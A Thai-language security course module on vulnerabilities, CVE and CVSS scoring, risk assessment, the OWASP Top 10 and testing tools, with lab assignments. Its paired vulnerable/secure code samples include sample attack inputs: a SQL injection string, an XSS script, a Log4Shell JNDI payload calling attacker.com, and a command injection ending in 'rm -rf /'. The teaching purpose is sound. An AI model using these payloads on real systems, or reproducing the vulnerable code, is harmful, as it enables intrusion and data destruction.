# สัปดาห์ที่ 3: ช่องโหว่และการประเมินความเสี่ยง
## Vulnerabilities & Risk Assessment + OWASP Top 10 + Security Testing Tools

**สำหรับ Software Engineers: จากพื้นฐานสู่ระดับกลาง**

---

## 📋 วัตถุประสงค์ของการเรียนรู้

- เข้าใจความหมายและประเภทของ Vulnerabilities
- ศึกษาระบบ Common Vulnerabilities and Exposures (CVE)
- เรียนรู้หลักการ Risk Assessment และ Risk Management
- ทำความเข้าใจ CVSS (Common Vulnerability Scoring System)
- ศึกษา OWASP Top 10 อย่างละเอียด
- เรียนรู้เครื่องมือ Security Testing ต่างๆ
- ฝึกปฏิบัติการประเมินความเสี่ยงในโครงการจริง

---

# Part 1: Fundamentals

## 📋 ช่องโหว่ (Vulnerabilities) คืออะไร?

**คำนิยาม:** ช่องโหว่ (Vulnerability) คือ จุดอ่อนหรือข้อบกพร่องในระบบ แอปพลิเคชัน หรือเครือข่ายที่สามารถถูกใช้ประโยชน์โดยผู้ไม่ประสงค์ดี

### ⚠️ ลักษณะสำคัญ
- เป็นจุดอ่อนที่มีอยู่ในระบบ
- สามารถถูกใช้ประโยชน์ได้ (Exploitable)
- ส่งผลกระทบต่อ CIA Triad (Confidentiality, Integrity, Availability)
- มีระดับความรุนแรงที่แตกต่างกัน

---

## 🔧 ประเภทของช่องโหว่

### Technical Vulnerabilities
- Buffer Overflow
- SQL Injection
- Cross-Site Scripting (XSS)
- Insecure Cryptographic Storage
- Authentication Bypass

### Human Vulnerabilities
- Social Engineering
- Phishing
- Weak Passwords
- Lack of Security Awareness
- Human Error

### Organizational Vulnerabilities
- Poor Security Policies
- Inadequate Access Controls
- Insufficient Training
- Lack of Incident Response Plan
- Weak Change Management

---

## 💉 ตัวอย่าง: SQL Injection

### ❌ Vulnerable Code:
```php
// PHP - Unsafe query
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysql_query($query);

// Attacker input: ' OR '1'='1' --
// Resulting query: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''
```

### ✅ Secure Code:
```php
// PHP - Using Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $hashedPassword]);
$user = $stmt->fetch();
```

---

## 🚨 ตัวอย่าง: Cross-Site Scripting (XSS)

### ❌ Vulnerable Code:
```javascript
// JavaScript - Direct DOM manipulation
function displayUserComment(comment) {
    document.getElementById('comments').innerHTML = comment;
}

// Malicious input: <script>alert('XSS Attack!')</script>
```

### ✅ Secure Code:
```javascript
// JavaScript - Proper sanitization
function displayUserComment(comment) {
    const sanitized = comment
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
    
    document.getElementById('comments').textContent = sanitized;
}
```

---

## 🏷️ Common Vulnerabilities and Exposures (CVE)

**CVE คืออะไร?** ระบบมาตรฐานสากลสำหรับการตั้งชื่อและอ้างอิงช่องโหว่ความปลอดภัยที่ทราบแล้ว

### 📝 รูปแบบ CVE ID
```
CVE-YYYY-NNNNN
```
- **YYYY** = ปีที่ค้นพบหรือเผยแพร่
- **NNNNN** = หมายเลขลำดับ (ขั้นต่ำ 4 หลัก)

### ตัวอย่าง CVE ที่มีชื่อเสียง:
- **CVE-2014-0160** - Heartbleed (OpenSSL)
- **CVE-2017-5638** - Apache Struts 2
- **CVE-2021-44228** - Log4Shell (Log4j)
- **CVE-2021-34527** - PrintNightmare (Windows)

---

## 🔥 ตัวอย่าง CVE: Log4Shell (CVE-2021-44228)

**ช่องโหว่ที่สะเทือนโลก**
- **CVSS Score:** 10.0 (Critical)
- **ผลกระทบ:** Remote Code Execution

### ❌ Vulnerable Log4j Usage:
```java
// Java - Vulnerable to JNDI Lookup
logger.info("User input: " + userInput);

// Malicious input: ${jndi:ldap://attacker.com/malicious}
// Result: โหลดและรัน malicious code จาก server ของผู้โจมตี
```

### ✅ การแก้ไข:
- อัปเดต Log4j เป็นเวอร์ชั่น 2.17.0 หรือใหม่กว่า
- ปิดการใช้งาน JNDI Lookup: `-Dlog4j2.formatMsgNoLookups=true`
- ใช้ Input Validation และ Sanitization
- ตรวจสอบ dependencies ที่ใช้ Log4j

---

## 📊 การประเมินความเสี่ยง (Risk Assessment)

**คำนิยาม:** กระบวนการระบุ วิเคราะห์ และประเมินความเสี่ยงที่อาจเกิดขึ้นกับระบบหรือองค์กร

### 🎯 วัตถุประสงค์
- ระบุภัยคุกคามและช่องโหว่
- ประเมินผลกระทบที่อาจเกิดขึ้น
- คำนวณระดับความเสี่ยง
- จัดลำดับความสำคัญในการแก้ไข
- วางแผนมาตรการป้องกัน

---

## 🧮 สูตรการคำนวณความเสี่ยง

```
Risk = Threat × Vulnerability × Impact
```

### ⚡ Threat (ภัยคุกคาม)
ความน่าจะเป็นที่จะเกิดการโจมตี
- Hackers / Cybercriminals
- Malware
- Natural Disasters
- Human Error
- Insider Threats

### 🕳️ Vulnerability (ช่องโหว่)
ความง่ายในการโจมตีช่องโหว่
- Ease of Exploitation
- Required Skills
- Access Requirements
- Detection Difficulty
- Availability of Exploits

### 💥 Impact (ผลกระทบ)
ระดับความเสียหายที่เกิดขึ้น
- Financial Loss
- Data Breach
- Service Disruption
- Reputation Damage
- Legal Consequences

---

## 🔄 กระบวนการบริหารความเสี่ยง

### 1️⃣ Risk Identification
**ระบุภัยคุกคามและช่องโหว่**
- Asset Inventory
- Threat Modeling
- Vulnerability Scanning
- Security Assessment

### 2️⃣ Risk Analysis
**วิเคราะห์และประเมินความเสี่ยง**
- Qualitative Analysis
- Quantitative Analysis
- CVSS Scoring
- Impact Assessment

### 3️⃣ Risk Evaluation
**ตัดสินใจและจัดลำดับความสำคัญ**
- Risk Matrix
- Risk Tolerance
- Business Impact
- Prioritization

### 4️⃣ Risk Treatment
**วางแผนและดำเนินการแก้ไข**
- **Accept** - ยอมรับความเสี่ยง
- **Avoid** - หลีกเลี่ยงความเสี่ยง
- **Transfer** - ถ่ายโอนความเสี่ยง
- **Mitigate** - ลดความเสี่ยง

---

## 📏 CVSS (Common Vulnerability Scoring System)

**CVSS คืออะไร?** ระบบมาตรฐานสำหรับการให้คะแนนความรุนแรงของช่องโหว่ความปลอดภัย

### 🎯 ระดับคะแนน CVSS
- **None (0.0)** - ไม่มีความเสี่ยง
- **Low (0.1-3.9)** - ความเสี่ยงต่ำ
- **Medium (4.0-6.9)** - ความเสี่ยงปานกลาง
- **High (7.0-8.9)** - ความเสี่ยงสูง
- **Critical (9.0-10.0)** - ความเสี่ยงวิกฤต

### ⚡ Base Metrics (คุณสมบัติพื้นฐานของช่องโหว่)
- **Attack Vector (AV):** Network, Adjacent, Local, Physical
- **Attack Complexity (AC):** Low, High
- **Privileges Required (PR):** None, Low, High
- **User Interaction (UI):** None, Required
- **Scope (S):** Unchanged, Changed
- **Confidentiality (C):** None, Low, High
- **Integrity (I):** None, Low, High
- **Availability (A):** None, Low, High

### ⏰ Temporal Metrics (เปลี่ยนแปลงตามเวลา)
- **Exploit Code Maturity:** ความพร้อมของ exploit
- **Remediation Level:** ระดับการแก้ไข
- **Report Confidence:** ความเชื่อมั่นในรายงาน

### 🏢 Environmental Metrics (เฉพาะสภาพแวดล้อม)
- **Confidentiality Requirement:** ความต้องการความลับ
- **Integrity Requirement:** ความต้องการความถูกต้อง
- **Availability Requirement:** ความต้องการความพร้อมใช้

---

## 🎯 ตัวอย่าง CVSS Scoring: Log4Shell

### 📊 CVSS 3.1 Vector:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

### Base Metrics การแปลความหมาย:
- **AV:N** - Network (สามารถโจมตีผ่านเครือข่าย)
- **AC:L** - Low (ง่ายต่อการโจมตี)
- **PR:N** - None (ไม่ต้องมีสิทธิพิเศษ)
- **UI:N** - None (ไม่ต้องมีการโต้ตอบจากผู้ใช้)
- **S:C** - Changed (ส่งผลกระทบข้ามระบบ)
- **C:H** - High (ผลกระทบต่อความลับสูง)
- **I:H** - High (ผลกระทบต่อความถูกต้องสูง)
- **A:H** - High (ผลกระทบต่อความพร้อมใช้งานสูง)

### 🎯 ผลลัพธ์: **10.0 CRITICAL**

---

## 📊 Risk Matrix

เครื่องมือสำหรับการตัดสินใจ

| LIKELIHOOD \ IMPACT | Very Low | Low | Medium | High | Very High |
|---------------------|----------|-----|--------|------|-----------|
| **Very High**       | Medium   | High | Critical | Critical | Critical |
| **High**            | Low      | Medium | High | Critical | Critical |
| **Medium**          | Low      | Low | Medium | High | High |
| **Low**             | Low      | Low | Low | Medium | Medium |
| **Very Low**        | Low      | Low | Low | Low | Low |

---

## ✅ Best Practices สำหรับ Software Engineers

### 🔒 Secure Coding
- Input Validation และ Sanitization
- ใช้ Prepared Statements
- Proper Error Handling
- Secure Authentication
- Output Encoding

### 🔍 Regular Assessment
- Static Application Security Testing (SAST)
- Dynamic Application Security Testing (DAST)
- Dependency Scanning
- Code Review
- Penetration Testing

### 📚 Stay Updated
- ติดตาม CVE Databases
- อัปเดต Dependencies
- Security Training
- Threat Intelligence
- Security Communities

---

## 🛠️ เครื่องมือและแหล่งข้อมูล

### Vulnerability Scanners
- **OWASP ZAP** - Web Application Scanner
- **Nessus** - Network Vulnerability Scanner
- **SonarQube** - Code Quality & Security
- **Snyk** - Dependency Vulnerability Scanner

### Knowledge Resources
- **NVD** - nvd.nist.gov
- **CVE** - cve.mitre.org
- **OWASP Top 10** - owasp.org
- **CWE** - cwe.mitre.org

### CVSS Calculators
- **NVD Calculator** - nvd.nist.gov/vuln-metrics/cvss
- **FIRST CVSS Calculator** - first.org/cvss/calculator
- **RedHat CVSS Calculator** - access.redhat.com/labs/cvss

---

## 📚 สถานการณ์จำลอง: E-commerce Application

### 🛒 บริบท
คุณเป็นนักพัฒนาในทีมที่รับผิดชอบระบบ E-commerce ขององค์กร

### ⚠️ ปัญหาที่พบ
- พบ SQL Injection ในหน้า Login
- ระบบ Payment Gateway ใช้ HTTP แทน HTTPS
- ไม่มีการ Hash Password
- Session Management ไม่ปลอดภัย
- ไม่มีการ Validate Input จาก User
- ไม่มีการจำกัด Rate Limiting

### ❓ คำถาม
จงทำการประเมินความเสี่ยงและจัดลำดับความสำคัญในการแก้ไข โดยใช้ CVSS และ Risk Matrix

---

## 🔬 LAB Assignment: Vulnerability Assessment Report

### 📋 รายละเอียดงาน
สร้างรายงานการประเมินความเสี่ยงสำหรับ Web Application

### ✅ ขั้นตอนการดำเนินงาน
1. **เลือกเว็บไซต์** - เลือก Web Application ที่จะวิเคราะห์ (อาจเป็นโปรเจกต์ส่วนตัวหรือ Demo Site)
2. **Vulnerability Scanning** - ใช้เครื่องมือ OWASP ZAP หรือ Burp Suite Community
3. **Manual Testing** - ทดสอบ OWASP Top 10 vulnerabilities
4. **CVSS Scoring** - ให้คะแนน CVSS สำหรับช่องโหว่ที่พบ
5. **Risk Assessment** - ประเมินความเสี่ยงและจัดลำดับความสำคัญ
6. **Remediation Plan** - เสนอแผนการแก้ไข

---

# Part 2: OWASP Top 10 - 2021

## 🛡️ OWASP คืออะไร?

**Open Web Application Security Project** - องค์กรไม่แสวงผลกำไรที่มุ่งเน้นปรับปรุงความปลอดภัยของซอฟต์แวร์

### 📊 OWASP Top 10
รายการช่องโหว่ความปลอดภัยที่พบบ่อยที่สุดในเว็บแอปพลิเคชัน อัปเดตทุก 3-4 ปี

**ประโยชน์:**
- เป็นมาตรฐานอ้างอิงสำหรับนักพัฒนา
- ช่วยจัดลำดับความสำคัญในการแก้ไข
- ใช้เป็นแนวทางในการออกแบบระบบ
- เป็นเครื่องมือสำหรับ Security Testing

---

## 🏆 OWASP Top 10 - 2021 Overview

| อันดับ | ช่องโหว่ | รายละเอียด |
|--------|----------|------------|
| **A01** | **Broken Access Control** | การควบคุมการเข้าถึงที่มีปัญหา |
| **A02** | **Cryptographic Failures** | ความล้มเหลวในการเข้ารหัส |
| **A03** | **Injection** | การฉีดคำสั่ง (SQL, NoSQL, OS) |
| **A04** | **Insecure Design** | การออกแบบที่ไม่ปลอดภัย |
| **A05** | **Security Misconfiguration** | การกำหนดค่าผิดพลาด |
| **A06** | **Vulnerable Components** | ส่วนประกอบที่มีช่องโหว่ |
| **A07** | **Authentication Failures** | ความล้มเหลวในการยืนยันตัวตน |
| **A08** | **Data Integrity Failures** | ความล้มเหลวในความสมบูรณ์ข้อมูล |
| **A09** | **Logging & Monitoring Failures** | ความล้มเหลวในการบันทึกและติดตาม |
| **A10** | **Server-Side Request Forgery** | การปลอมแปลงคำขอฝั่งเซิร์ฟเวอร์ |

---

## 🚪 A01: Broken Access Control

### การควบคุมการเข้าถึงที่มีปัญหา
ผู้ใช้สามารถเข้าถึงข้อมูลหรือฟังก์ชันที่ไม่ได้รับอนุญาต

### ⚠️ ตัวอย่างการโจมตี
- เปลี่ยน URL เพื่อเข้าถึงข้อมูลของผู้อื่น
- การ Privilege Escalation
- การเข้าถึง API ที่ไม่ได้รับอนุญาต
- การ Bypass Access Control
- การแก้ไข metadata หรือ JWT tokens

### ❌ Vulnerable Code:
```javascript
// ไม่มีการตรวจสอบสิทธิ์
app.get('/user/:id/profile', (req, res) => {
    const userId = req.params.id;
    const user = getUserById(userId);
    res.json(user);
});

// URL: /user/123/profile สามารถเข้าถึงโปรไฟล์ของใครก็ได้
```

### ✅ Secure Code:
```javascript
// ตรวจสอบสิทธิ์ก่อนเข้าถึงข้อมูล
app.get('/user/:id/profile', authenticateToken, (req, res) => {
    const userId = req.params.id;
    const currentUserId = req.user.id;
    
    if (userId !== currentUserId && !req.user.isAdmin) {
        return res.status(403).json({ error: 'Access denied' });
    }
    
    const user = getUserById(userId);
    res.json(user);
});
```

---

## 🔐 A02: Cryptographic Failures

### ความล้มเหลวในการเข้ารหัส
การใช้งานการเข้ารหัสที่ไม่เหมาะสมหรือไม่มีการเข้ารหัสเลย

### ⚠️ ปัญหาที่พบบ่อย
- เก็บรหัสผ่านแบบ plaintext
- ใช้ encryption algorithm ที่เก่า
- การส่งข้อมูลผ่าน HTTP แทน HTTPS
- การใช้ Default encryption keys
- ใช้ weak hashing functions (MD5, SHA1)

### ✅ การป้องกัน
- ใช้ HTTPS สำหรับการส่งข้อมูล
- Hash รหัสผ่านด้วย bcrypt, scrypt, Argon2
- ใช้ strong encryption algorithms
- จัดการ encryption keys อย่างปลอดภัย
- ไม่เก็บข้อมูลสำคัญแบบ plaintext

### ❌ Vulnerable Code:
```javascript
// เก็บรหัสผ่านแบบ plaintext
const user = {
    username: 'john',
    password: 'mypassword123'  // ❌ ไม่ปลอดภัย
};

// ส่งข้อมูลผ่าน HTTP
fetch('http://api.example.com/login', {
    method: 'POST',
    body: JSON.stringify(credentials)
});
```

### ✅ Secure Code:
```javascript
const bcrypt = require('bcrypt');

// Hash รหัสผ่านก่อนเก็บ
const hashedPassword = await bcrypt.hash('mypassword123', 10);
const user = {
    username: 'john',
    password: hashedPassword  // ✅ ปลอดภัย
};

// ส่งข้อมูลผ่าน HTTPS
fetch('https://api.example.com/login', {
    method: 'POST',
    body: JSON.stringify(credentials)
});
```

---

## 💉 A03: Injection

### การฉีดคำสั่ง
การส่งข้อมูลที่ไม่ถูกต้องเพื่อให้แอปพลิเคชันรันคำสั่งที่ไม่ต้องการ

### 🗃️ ประเภทของ Injection
- **SQL Injection** - ฉีดคำสั่ง SQL ผ่าน input
- **NoSQL Injection** - ฉีดคำสั่งใน NoSQL databases
- **OS Command Injection** - ฉีดคำสั่งระบบปฏิบัติการ
- **LDAP Injection** - ฉีดคำสั่ง LDAP queries

### ❌ OS Command Injection Example:
```javascript
// Node.js - Vulnerable to command injection
const { exec } = require('child_process');

app.post('/ping', (req, res) => {
    const host = req.body.host;
    exec(`ping -c 4 ${host}`, (error, stdout) => {
        res.send(stdout);
    });
});

// Malicious input: "google.com; rm -rf /"
```

### ✅ Secure Version:
```javascript
const { spawn } = require('child_process');

app.post('/ping', (req, res) => {
    const host = req.body.host;
    
    // Validate input
    if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
        return res.status(400).send('Invalid host format');
    }
    
    const ping = spawn('ping', ['-c', '4', host]);
    let output = '';
    
    ping.stdout.on('data', (data) => {
        output += data;
    });
    
    ping.on('close', () => {
        res.send(output);
    });
});
```

---

## 🏗️ A04: Insecure Design

### การออกแบบที่ไม่ปลอดภัย
ข้อบกพร่องในการออกแบบระบบที่ไม่สามารถแก้ไขด้วยการ implement ที่ดีได้

### ⚠️ ปัญหาในการออกแบบ
- ไม่มี Threat Modeling
- ไม่คิดถึง Security Requirements
- ไม่มี Defense in Depth
- ไม่ได้ทำ Security by Design
- ไม่มีการควบคุม Business Logic

### ✅ Secure Design Principles
- Threat Modeling ในช่วงการออกแบบ
- Principle of Least Privilege
- Defense in Depth
- Fail Secure (แม้เกิดข้อผิดพลาดก็ปลอดภัย)
- Zero Trust Architecture

### 📝 ตัวอย่างสถานการณ์
**ปัญหา:** ระบบ E-commerce ไม่มีการจำกัดจำนวนคูปองส่วนลดที่ใช้ได้

**ผลกระทบ:** ผู้ใช้สามารถใช้คูปองเดียวกันได้หลายครั้ง ทำให้ร้านขาดทุน

**วิธีแก้:** ออกแบบระบบให้มีการตรวจสอบและจำกัดการใช้คูปอง พร้อม rate limiting

---

## ⚙️ A05: Security Misconfiguration

### การกำหนดค่าความปลอดภัยผิดพลาด
การตั้งค่าระบบ, เฟรมเวิร์ก, หรือไลบรารีที่ไม่ปลอดภัย

### ⚠️ ปัญหาที่พบบ่อย
- ใช้รหัสผ่าน default
- เปิดใช้งาน feature ที่ไม่จำเป็น
- แสดง error message รายละเอียด
- ไม่อัปเดต security patches
- การตั้งค่า CORS ที่ไม่ปลอดภัย

### ✅ การป้องกัน
- ใช้ Security Hardening Guidelines
- ปิดการใช้งาน features ที่ไม่ต้องการ
- ตรวจสอบการตั้งค่าอย่างสม่ำเสมอ
- ใช้ automated configuration scanning

### ❌ Insecure CORS Configuration:
```javascript
// Express.js - อันตราย: อนุญาตทุก origin
app.use(cors({
    origin: '*',
    credentials: true
}));

// เปิด debug mode ใน production
app.set('env', 'development');
```

### ✅ Secure CORS Configuration:
```javascript
// Express.js - ปลอดภัย: กำหนด origin ที่เฉพาะเจาะจง
app.use(cors({
    origin: ['https://myapp.com', 'https://www.myapp.com'],
    credentials: true,
    optionsSuccessStatus: 200
}));

// ปิด debug mode ใน production
if (process.env.NODE_ENV === 'production') {
    app.set('env', 'production');
}
```

---

## 📦 A06-A10: Quick Overview

### A06: Vulnerable Components
- **ปัญหา:** ใช้ library ที่มีช่องโหว่
- **ตัวอย่าง:** Log4Shell (Log4j), Struts
- **วิธีแก้:** ใช้ dependency scanning tools

### A07: Authentication Failures
- **ปัญหา:** การยืนยันตัวตนที่อ่อนแอ
- **ตัวอย่าง:** Weak passwords, session hijacking
- **วิธีแก้:** MFA, strong session management

### A08: Data Integrity Failures
- **ปัญหา:** ไม่ verify integrity ของข้อมูล
- **ตัวอย่าง:** Malicious software updates
- **วิธีแก้:** Digital signatures, checksums

### A09: Logging & Monitoring Failures
- **ปัญหา:** ไม่มี logging ที่เพียงพอ
- **ตัวอย่าง:** ไม่สามารถตรวจจับการโจมตีได้
- **วิธีแก้:** Comprehensive logging, real-time monitoring

### A10: Server-Side Request Forgery (SSRF)
- **ปัญหา:** Server ทำการ request ตาม input ของ user
- **ตัวอย่าง:** เข้าถึง internal services
- **วิธีแก้:** Input validation, network segmentation

---

# Part 3: Security Testing Tools

## 🧪 การทดสอบความปลอดภัย

เครื่องมือและเทคนิคสำหรับการค้นหาและประเมินช่องโหว่ในแอปพลิเคชัน

### 📊 ประเภทของ Security Testing

#### SAST (Static Application Security Testing)
**วิเคราะห์ source code โดยไม่ต้องรันโปรแกรม**
- วิเคราะห์โครงสร้างและลำดับการทำงานของโค้ด
- ตรวจหาช่องโหว่ในขณะ development
- สามารถรันได้เร็วและครอบคลุม code ทั้งหมด

#### DAST (Dynamic Application Security Testing)
**ทดสอบแอปพลิเคชันขณะที่กำลังทำงาน**
- จำลองการโจมตีจากภายนอก
- ทดสอบ running application
- ตรวจหาช่องโหว่ที่เกิดขึ้นจริง

#### IAST (Interactive Application Security Testing)
**รวม SAST และ DAST เข้าด้วยกัน**
- วิเคราะห์แอปพลิเคชันจากภายในขณะทำงาน
- ให้ข้อมูลที่แม่นยำกว่า SAST หรือ DAST เพียงอย่างเดียว
- ลด false positives

#### SCA (Software Composition Analysis)
**ตรวจสอบช่องโหว่ใน dependencies**
- สแกนไลบรารีและ open source components
- ตรวจสอบ license compliance
- ติดตามช่องโหว่ใหม่ใน dependencies

---

## 🕷️ OWASP ZAP (Zed Attack Proxy)

### Free, open-source web application security scanner

#### ✅ คุณสมบัติหลัก
- Automated Security Scanning
- Manual Testing Support
- Active และ Passive Scanning
- API Testing
- CI/CD Integration
- Extensible with Add-ons

#### 🎯 การใช้งาน
1. ตั้งค่า Proxy ในเบราว์เซอร์
2. Browse ผ่านแอปพลิเคชัน
3. รัน Active Scan
4. ตรวจสอบผลลัพธ์
5. Manual Testing เพิ่มเติม

#### 🖥️ ZAP Command Line Examples:

```bash
# Quick scan
zap-baseline.py -t https://example.com

# Full scan with report
zap-full-scan.py -t https://example.com -r zap-report.html

# API scan
zap-api-scan.py -t https://api.example.com/openapi.json

# Docker usage
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable \
    zap-baseline.py -t https://example.com -g gen.conf -r testreport.html
```

---

## 🔧 Burp Suite

### เครื่องมือ Security Testing ที่ครอบคลุม

#### 🆓 Community Edition (ฟรี)
- Proxy และ Intercept
- Manual Testing
- Basic Scanner (จำกัด)
- Repeater
- Decoder

#### 💰 Professional Edition (เสียเงิน)
- Advanced Scanner
- Intruder (Automated Attacks)
- Extensions Support
- Detailed Reporting
- Collaborator

#### ✅ วิธีการใช้งาน Burp Suite
1. **Proxy Setup:** กำหนดเบราว์เซอร์ให้ใช้ Burp เป็น proxy (127.0.0.1:8080)
2. **Target Mapping:** สำรวจโครงสร้างของแอปพลิเคชัน
3. **Manual Testing:** ใช้ Repeater ทดสอบ requests
4. **Automated Scanning:** รัน vulnerability scanner
5. **Exploitation:** ใช้ Intruder สำหรับ advanced attacks

---

## 🔍 Static Analysis Tools (SAST)

### SonarQube
- **ภาษา:** Java, C#, JavaScript, Python, PHP
- **คุณสมบัติ:** Code quality + Security
- **การใช้:** CI/CD integration, Dashboard

### CodeQL (GitHub)
- **ภาษา:** C/C++, C#, Java, JavaScript, Python
- **คุณสมบัติ:** Advanced semantic analysis
- **การใช้:** GitHub Actions, Custom queries

### ESLint Security Plugin
- **ภาษา:** JavaScript, TypeScript
- **คุณสมบัติ:** Real-time security checking
- **การใช้:** IDE integration, Build process

### Semgrep
- **ภาษา:** 20+ languages
- **คุณสมบัติ:** Custom rules, Fast scanning
- **การใช้:** CI/CD, Local development

#### 🖥️ ตัวอย่างการใช้งาน:

```bash
# SonarQube Scanner
sonar-scanner \
  -Dsonar.projectKey=myproject \
  -Dsonar.sources=src \
  -Dsonar.host.url=http://localhost:9000

# ESLint Security
npm install --save-dev eslint-plugin-security
# .eslintrc.js: plugins: ['security']

# Semgrep
semgrep --config=auto src/
semgrep --config=p/owasp-top-ten src/
```

---

## 📦 Dependency Scanning Tools (SCA)

### Software Composition Analysis
ตรวจสอบช่องโหว่ใน third-party libraries และ dependencies

### Snyk
- **รองรับ:** npm, pip, composer, Maven, Gradle
- **คุณสมบัติ:** Fix suggestions, License compliance
- **ราคา:** Free tier + Paid plans

### OWASP Dependency-Check
- **รองรับ:** Java, .NET, JavaScript, Python
- **คุณสมบัติ:** CVE database integration
- **ราคา:** Free และ Open Source

### GitHub Dependabot
- **รองรับ:** ภาษาส่วนใหญ่
- **คุณสมบัติ:** Auto-updates, PR creation
- **ราคา:** Free สำหรับ public repos

### WhiteSource/Mend
- **รองรับ:** 200+ programming languages
- **คุณสมบัติ:** Enterprise features, Policy enforcement
- **ราคา:** Enterprise solution

#### 🖥️ ตัวอย่างการใช้งาน:

```bash
# Snyk CLI
npm install -g snyk
snyk test                    # Scan for vulnerabilities
snyk monitor                 # Continuous monitoring
snyk fix                     # Auto-fix vulnerabilities

# OWASP Dependency-Check
dependency-check.sh --project myproject --scan ./src

# npm audit (built-in)
npm audit                    # Show vulnerabilities
npm audit fix                # Auto-fix when possible
```

#### GitHub Dependabot Configuration:
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
  - package-ecosystem: "pip"
    directory: "/requirements"
    schedule:
      interval: "weekly"
```

---

## 🚀 Advanced Security Testing Techniques

### 🤖 Fuzzing
**ส่งข้อมูลแบบสุ่มเพื่อหาจุดผิดพลาด**
- **Tools:** AFL, libFuzzer, Boofuzz
- **Target:** API endpoints, File parsers
- **Benefits:** ค้นหาช่องโหว่ที่ไม่คาดคิด

### 🏰 Penetration Testing
**การทดสอบแบบจำลองการโจมตีจริง**
- **Phases:** Recon, Scanning, Exploitation
- **Tools:** Metasploit, Kali Linux
- **Benefits:** ประเมินความเสี่ยงแบบองค์รวม

### 🔍 Code Review
**การตรวจสอบ source code โดยมนุษย์**
- **Focus:** Authentication, Authorization
- **Process:** Peer review, Security review
- **Benefits:** ตรวจหา Logic flaws

### 🌐 API Security Testing
**การทดสอบ REST/GraphQL APIs**
- **Tools:** Postman, RestAssured, GraphQL Voyager
- **Tests:** BOLA, Rate limiting, Input validation
- **Benefits:** ครอบคลุม API endpoints

#### ✅ Best Practices สำหรับ Security Testing
- **Shift Left:** ทดสอบความปลอดภัยตั้งแต่เริ่มพัฒนา
- **Continuous Testing:** รวมเข้า CI/CD pipeline
- **Risk-Based Testing:** มุ่งเน้นที่ high-risk areas
- **Team Collaboration:** ความร่วมมือระหว่าง Dev, Sec, Ops

---

## 🔄 การรวม Security Testing เข้า CI/CD

### DevSecOps Pipeline
รวมการทดสอบความปลอดภัยเข้าไปในกระบวนการพัฒนา

#### 🖥️ GitHub Actions Example:

```yaml
name: Security Pipeline
on: [push, pull_request]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      # SAST - Static Analysis
      - name: Run Semgrep
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
            p/owasp-top-ten
        
      # SCA - Dependency Check
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=medium
          
      # DAST - Dynamic Testing (staging)
      - name: ZAP Baseline Scan
        if: github.ref == 'refs/heads/main'
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://staging.myapp.com'
          rules_file_name: '.zap/rules.tsv'
          
      # Security Gates
      - name: Security Gate
        run: |
          if [ "$SECURITY_ISSUES" -gt 0 ]; then
            echo "Security issues found. Blocking deployment."
            exit 1
          fi

      # Notification
      - name: Notify Team
        if: failure()
        uses: 8398a7/action-slack@v3
        with:
          status: failure
          text: "Security scan failed! Please check the results."
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK }}
```

#### ✅ Pipeline Security Gates
- หยุดการ deploy หากพบช่องโหว่ Critical/High
- สร้าง security reports
- แจ้งเตือนทีมผ่าน Slack/Email
- Track security metrics

#### ⚠️ ข้อควรระวัง
- Balance security กับ speed of delivery
- ตั้งค่า threshold ที่เหมาะสม
- จัดการ false positives
- Training ทีมให้เข้าใจ security

---

## 🔬 Comprehensive Security Testing Lab

### โปรเจคปฏิบัติการ: End-to-End Security Assessment

#### 📋 รายละเอียดงาน
ทำการประเมินความปลอดภัยแบบครอบคลุมสำหรับ Web Application รวมถึง OWASP Top 10 Testing

#### 📊 ขอบเขตงาน

##### 1. Target Selection
- เลือก Web App: DVWA, OWASP Juice Shop, หรือโปรเจคตัวเอง
- ระบุขอบเขตการทดสอบ
- เตรียม test environment

##### 2. OWASP Top 10 Testing
- ทดสอบช่องโหว่ทั้ง 10 รายการ
- ใช้ automated tools (ZAP, Burp)
- ทำ manual testing
- บันทึก proof of concepts

##### 3. Multi-layered Testing

**SAST Testing:**
```bash
# ใช้ SonarQube
sonar-scanner -Dsonar.projectKey=security-test

# ใช้ Semgrep
semgrep --config=p/owasp-top-ten --json --output=sast-results.json src/
```

**DAST Testing:**
```bash
# ใช้ OWASP ZAP
zap-full-scan.py -t https://target.com -r dast-report.html

# ใช้ Burp Suite (Professional)
# Manual configuration และ active scan
```

**SCA Testing:**
```bash
# ใช้ Snyk
snyk test --json > sca-results.json

# ใช้ OWASP Dependency-Check
dependency-check.sh --project myapp --scan ./src --format JSON --out dependency-check-report.json
```

##### 4. Risk Assessment
- CVSS Scoring สำหรับช่องโหว่ที่พบ
- Risk Matrix Analysis
- Business Impact Assessment
- Priority ranking

#### 📑 Deliverables

##### 1. Executive Summary (1-2 หน้า)
- ภาพรวมผลการประเมิน
- Key findings และ recommendations
- Risk summary
- Budget และ timeline สำหรับการแก้ไข

##### 2. Technical Report (15-20 หน้า)

**โครงสร้างรายงาน:**
```markdown
1. Introduction
   - Scope และ methodology
   - Tools ที่ใช้
   - Test environment

2. OWASP Top 10 Assessment Results
   - A01: Broken Access Control
   - A02: Cryptographic Failures
   - ... (ครบทั้ง 10 รายการ)

3. Vulnerability Details
   - รายการช่องโหว่ที่พบ
   - CVSS Score
   - Proof of Concept
   - Screenshots/Videos

4. Risk Assessment
   - Risk Matrix
   - Impact Analysis
   - Prioritization

5. Remediation Recommendations
   - แผนการแก้ไขแต่ละช่องโหว่
   - Timeline
   - Cost-Benefit Analysis

6. Appendices
